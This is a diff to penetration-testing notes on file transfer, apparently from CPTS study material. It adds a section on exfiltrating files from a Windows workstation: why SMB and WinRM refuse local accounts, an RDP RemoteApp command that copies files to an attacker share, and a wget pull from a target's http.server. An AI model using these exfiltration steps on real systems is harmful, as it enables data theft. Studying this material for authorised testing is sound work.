@@ -35,8 +35,6 @@ The attacker leverages existing system utilities, network protocols (HTTP, SMB, 
 
 ---
 
-## Windows File Transfer Methods
-
 ### PowerShell Download (Preferred)
 
 ```powershell
@@ -140,8 +138,6 @@ sudo python3 -m pyftpdlib --port 21 --user test --password test
 ```
 
 ---
-
-## Linux File Transfer Methods
 
 ### wget / cURL Download
 
@@ -324,3 +320,21 @@ Key evasion principles:
 ## Sources
 
 - CPTS File Transfer module (Windows, Linux, Miscellaneous, LOLBins, Detection, Evading Detection)
+
+
+
+## Exfil off a Windows workstation (lane ranking)
+
+Pulling a large bundle OFF a Windows box when you hold only a local account (even one in Administrators):
+
+- SMB `C$` and WinRM (evil-winrm) both REFUSE local accounts over the network by default (UAC remote filtering / LocalAccountTokenFilterPolicy). One denial each is enough; do not grind them or re-try with fresh local accounts.
+- RDP drive redirection plus RemoteApp (`/app:"program:cmd.exe,cmd:/c copy <file> \\tsclient\<share>"`) authenticates fine, but freerdp3 RAIL crashes (BadAtom) on a headless Xvfb display; full-desktop `/drive` works only with a real display or an operator watching the session.
+- Fastest lane when the target already runs an http.server (common on lab/DFIR boxes): plain wget from the attacker. Enumerate which directory it roots; a server relaunched after a reboot often roots at the user profile, putting every user file one GET away.
+
+```sh
+wget http://<target-ip>:<port>/<bundle>.zip
+```
+
+- If the http.server belongs to the environment or another user, never kill or restart it to change its root; find a path it already serves.
+
+<!-- promoted-slug: exfil-off-windows -->
